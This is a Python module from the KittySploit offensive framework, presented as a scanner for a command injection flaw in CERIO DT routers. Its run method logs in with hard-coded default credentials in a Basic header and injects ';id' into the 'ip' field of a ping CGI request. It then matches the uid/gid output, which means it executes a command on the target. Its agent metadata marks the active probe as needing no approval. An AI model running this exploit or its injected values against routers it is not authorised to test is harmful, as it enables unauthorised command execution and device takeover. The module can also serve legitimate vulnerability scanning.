#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CERIO DT series routers have an operation command injection vulnerability in specific versions."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CERIO-DT Interface - Command Execution Detection',
        'description': 'CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cerio', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/20142995/sectool',
            'https://github.com/tanjiti/sec_profile',
            'https://github.com/wy876/POC/blob/main/D-Link_DAR-8000%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2023-4542).md',
        ],
    }

    def run(self):
        path = '/cgi-bin/Save.cgi?cgi=PING'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Authorization': 'Basic b3BlcmF0b3I6MTIzNA==', 'Content-Type': 'application/x-www-form-urlencoded'}, data='pid=2061&ip=127.0.0.1;id&times=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='CERIO-DT Interface - Command Execution detected', path=path)
            return True
        return False

